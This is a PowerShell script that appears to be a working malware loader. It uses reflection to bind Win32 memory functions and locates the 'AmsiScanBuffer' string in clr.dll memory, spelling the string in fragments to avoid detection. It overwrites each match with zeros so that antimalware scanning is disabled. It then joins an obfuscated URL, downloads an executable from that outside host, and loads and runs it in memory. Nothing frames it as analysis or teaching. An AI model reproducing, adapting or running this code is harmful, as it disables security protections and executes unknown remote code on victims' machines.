$page_readonly = 0x02
$page_readwrite = 0x04
$page_execute_readwrite = 0x40
$page_execute_read = 0x20
$page_guard = 0x100
$mem_commit = 0x1000
$max_path = 260
function bvKLeYNXgYcHSSrooWILHwsaWAbquHNAMktFwELJEGYrGTCXsrSIgWffzwHqiFFmaDNMZDKabej {
    param ($protect, $state)
    return ((($protect -band $page_readonly) -eq $page_readonly -or ($protect -band $page_readwrite) -eq $page_readwrite -or ($protect -band $page_execute_readwrite) -eq $page_execute_readwrite -or ($protect -band $page_execute_read) -eq $page_execute_read) -and ($protect -band $page_guard) -ne $page_guard -and ($state -band $mem_commit) -eq $mem_commit)
}
function bYRqQeDrgusgKPfSrCBmeZddeJApLyYaulMcIneGrWvWWVdvkMbYnixgYyLXYEfOmUOvDUuFBSs {
    param ($buffer, $pattern, $index)
    for ($i = 0; $i -lt $pattern.Length; $i++) {
        if ($buffer[$index + $i] -ne $pattern[$i]) {
            return $false
        }
    }
    return $true
}
if ($psversiontable.PSVersion.Major -gt 2) {
    $dynassembly = New-Object System.Reflection.AssemblyName("Win32")
    $assemblybuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($dynassembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $modulebuilder = $assemblybuilder.DefineDynamicModule("Win32", $false)
    $typebuilder = $modulebuilder.DefineType("Win32.MEMORY_INFO_BASIC", [System.Reflection.TypeAttributes]::Public + [System.Reflection.TypeAttributes]::Sealed + [System.Reflection.TypeAttributes]::SequentialLayout, [System.ValueType])
    [void]$typebuilder.DefineField("BaseAddress", [IntPtr], [System.Reflection.FieldAttributes]::Public)
    [void]$typebuilder.DefineField("AllocationBase", [IntPtr], [System.Reflection.FieldAttributes]::Public)
    [void]$typebuilder.DefineField("AllocationProtect", [Int32], [System.Reflection.FieldAttributes]::Public)
    [void]$typebuilder.DefineField("RegionSize", [IntPtr], [System.Reflection.FieldAttributes]::Public)
    [void]$typebuilder.DefineField("State", [Int32], [System.Reflection.FieldAttributes]::Public)
    [void]$typebuilder.DefineField("Protect", [Int32], [System.Reflection.FieldAttributes]::Public)
    [void]$typebuilder.DefineField("Type", [Int32], [System.Reflection.FieldAttributes]::Public)
    $memory_info_basic_struct = $typebuilder.CreateType()
    $typebuilder = $modulebuilder.DefineType("Win32.SYSTEM_INFO", [System.Reflection.TypeAttributes]::Public + [System.Reflection.TypeAttributes]::Sealed + [System.Reflection.TypeAttributes]::SequentialLayout, [System.ValueType])
    [void]$typebuilder.DefineField("wProcessorArchitecture", [UInt16], [System.Reflection.FieldAttributes]::Public)
    [void]$typebuilder.DefineField("wReserved", [UInt16], [System.Reflection.FieldAttributes]::Public)
    [void]$typebuilder.DefineField("dwPageSize", [UInt32], [System.Reflection.FieldAttributes]::Public)
    [void]$typebuilder.DefineField("lpMinimumApplicationAddress", [IntPtr], [System.Reflection.FieldAttributes]::Public)
    [void]$typebuilder.DefineField("lpMaximumApplicationAddress", [IntPtr], [System.Reflection.FieldAttributes]::Public)
    [void]$typebuilder.DefineField("dwActiveProcessorMask", [IntPtr], [System.Reflection.FieldAttributes]::Public)
    [void]$typebuilder.DefineField("dwNumberOfProcessors", [UInt32], [System.Reflection.FieldAttributes]::Public)
    [void]$typebuilder.DefineField("dwProcessorType", [UInt32], [System.Reflection.FieldAttributes]::Public)
    [void]$typebuilder.DefineField("dwAllocationGranularity", [UInt32], [System.Reflection.FieldAttributes]::Public)
    [void]$typebuilder.DefineField("wProcessorLevel", [UInt16], [System.Reflection.FieldAttributes]::Public)
    [void]$typebuilder.DefineField("wProcessorRevision", [UInt16], [System.Reflection.FieldAttributes]::Public)
    $system_info_struct = $typebuilder.CreateType()
    $typebuilder = $modulebuilder.DefineType("Win32.Kernel32", "Public, Class")
    $dllimportconstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
    $setlasterror = [Runtime.InteropServices.DllImportAttribute].GetField("SetLastError")
    $setlasterrorcustomattribute = New-Object Reflection.Emit.CustomAttributeBuilder($dllimportconstructor, "kernel32.dll", [Reflection.FieldInfo[]]@($setlasterror), @($true))
    $pinvokemethod = $typebuilder.DefinePInvokeMethod("VirtualProtect", "kernel32.dll", ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [bool], [Type[]]@([IntPtr], [IntPtr], [Int32], [Int32].MakeByRefType()), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
    $pinvokemethod.SetCustomAttribute($setlasterrorcustomattribute)
    $pinvokemethod = $typebuilder.DefinePInvokeMethod("GetCurrentProcess", "kernel32.dll", ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [IntPtr], [Type[]]@(), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
    $pinvokemethod.SetCustomAttribute($setlasterrorcustomattribute)
    $pinvokemethod = $typebuilder.DefinePInvokeMethod("VirtualQuery", "kernel32.dll", ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [IntPtr], [Type[]]@([IntPtr], [Win32.MEMORY_INFO_BASIC].MakeByRefType(), [uint32]), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
    $pinvokemethod.SetCustomAttribute($setlasterrorcustomattribute)
    $pinvokemethod = $typebuilder.DefinePInvokeMethod("GetSystemInfo", "kernel32.dll", ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [void], [Type[]]@([Win32.SYSTEM_INFO].MakeByRefType()), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
    $pinvokemethod.SetCustomAttribute($setlasterrorcustomattribute)
    $pinvokemethod = $typebuilder.DefinePInvokeMethod("GetMappedFileName", "psapi.dll", ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [Int32], [Type[]]@([IntPtr], [IntPtr], [System.Text.StringBuilder], [uint32]), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
    $pinvokemethod.SetCustomAttribute($setlasterrorcustomattribute)
    $pinvokemethod = $typebuilder.DefinePInvokeMethod("ReadProcessMemory", "kernel32.dll", ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [Int32], [Type[]]@([IntPtr], [IntPtr], [byte[]], [int], [int].MakeByRefType()), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
    $pinvokemethod.SetCustomAttribute($setlasterrorcustomattribute)
    $pinvokemethod = $typebuilder.DefinePInvokeMethod("WriteProcessMemory", "kernel32.dll", ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static), [Reflection.CallingConventions]::Standard, [Int32], [Type[]]@([IntPtr], [IntPtr], [byte[]], [int], [int].MakeByRefType()), [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
    $pinvokemethod.SetCustomAttribute($setlasterrorcustomattribute)
    $kernel32 = $typebuilder.CreateType()
    $a = 'Ams'
    $b = 'iSc'
    $c = 'anBuf'
    $d = 'fer'
    $signature = [System.Text.Encoding]::UTF8.GetBytes($a + $b + $c + $d)
    $hprocess = [Win32.Kernel32]::GetCurrentProcess()
    $sysinfo = New-Object Win32.SYSTEM_INFO
    [void][Win32.Kernel32]::GetSystemInfo([ref]$sysinfo)
    $memoryregions = @()
    $address = [IntPtr]::Zero
    while ($address.ToInt64() -lt $sysinfo.lpMaximumApplicationAddress.ToInt64()) {
        $meminfo = New-Object Win32.MEMORY_INFO_BASIC
        if ([Win32.Kernel32]::VirtualQuery($address, [ref]$meminfo, [System.Runtime.InteropServices.Marshal]::SizeOf($meminfo))) {
            $memoryregions += $meminfo
        }
        $address = New-Object IntPtr($meminfo.BaseAddress.ToInt64() + $meminfo.RegionSize.ToInt64())
    }
    $count = 0
    foreach ($region in $memoryregions) {
        if (-not (bvKLeYNXgYcHSSrooWILHwsaWAbquHNAMktFwELJEGYrGTCXsrSIgWffzwHqiFFmaDNMZDKabej $region.Protect $region.State)) {
            continue
        }
        $pathbuilder = New-Object System.Text.StringBuilder $max_path
        if ([Win32.Kernel32]::GetMappedFileName($hprocess, $region.BaseAddress, $pathbuilder, $max_path) -gt 0) {
            $path = $pathbuilder.ToString()
            if ($path.EndsWith("clr.dll", [StringComparison]::InvariantCultureIgnoreCase)) {
                $buffer = New-Object byte[] $region.RegionSize.ToInt64()
                $bytesread = 0
                [void][Win32.Kernel32]::ReadProcessMemory($hprocess, $region.BaseAddress, $buffer, $buffer.Length, [ref]$bytesread)
                for ($k = 0; $k -lt ($bytesread - $signature.Length); $k++) {
                    $found = $true
                    for ($m = 0; $m -lt $signature.Length; $m++) {
                        if ($buffer[$k + $m] -ne $signature[$m]) {
                            $found = $false
                            break
                        }
                    }
                    if ($found) {
                        $oldprotect = 0
                        if (($region.Protect -band $page_readwrite) -ne $page_readwrite) {
                            [void][Win32.Kernel32]::VirtualProtect($region.BaseAddress, $buffer.Length, $page_execute_readwrite, [ref]$oldprotect)
                        }
                        $replacement = New-Object byte[] $signature.Length
                        $byteswritten = 0
                        [void][Win32.Kernel32]::WriteProcessMemory($hprocess, [IntPtr]::Add($region.BaseAddress, $k), $replacement, $replacement.Length, [ref]$byteswritten)
                        $count++
                        if (($region.Protect -band $page_readwrite) -ne $page_readwrite) {
                            [void][Win32.Kernel32]::VirtualProtect($region.BaseAddress, $buffer.Length, $region.Protect, [ref]$oldprotect)
                        }
                    }
                }
            }
        }
    }
}

# URL parçalanmýþ þekilde
$url = 'https' + '://an' + 'onbi' + 'ns.n' + 'et/di' + 'rect.p' + 'hp/GI' + 'T.exe'

Add-Type -AssemblyName System.Net.Http
$httpclient = [System.Net.Http.HttpClient]::new()
$task = $httpclient.GetByteArrayAsync($url)
try {
    $task.Wait()
    $bytes = $task.Result
    $assembly = [System.Reflection.Assembly]::Load([byte[]]$bytes)
    $entrypoint = $assembly.EntryPoint
    if ($null -ne $entrypoint) {
        $params = $entrypoint.GetParameters()
        if ($params.Count -eq 0) {
            $entrypoint.Invoke($null, $null)
        } else {
            $args = New-Object Object[] $params.Count
            for ($i = 0; $i -lt $params.Count; $i++) {
                if ($params[$i].ParameterType -eq [string[]]) {
                    $args[$i] = [string[]]@()
                } else {
                    $args[$i] = $null
                }
            }
            $entrypoint.Invoke($null, $args)
        }
    } else {
        Write-Warning "!"
    }
} catch {
    Write-Error "!"
}
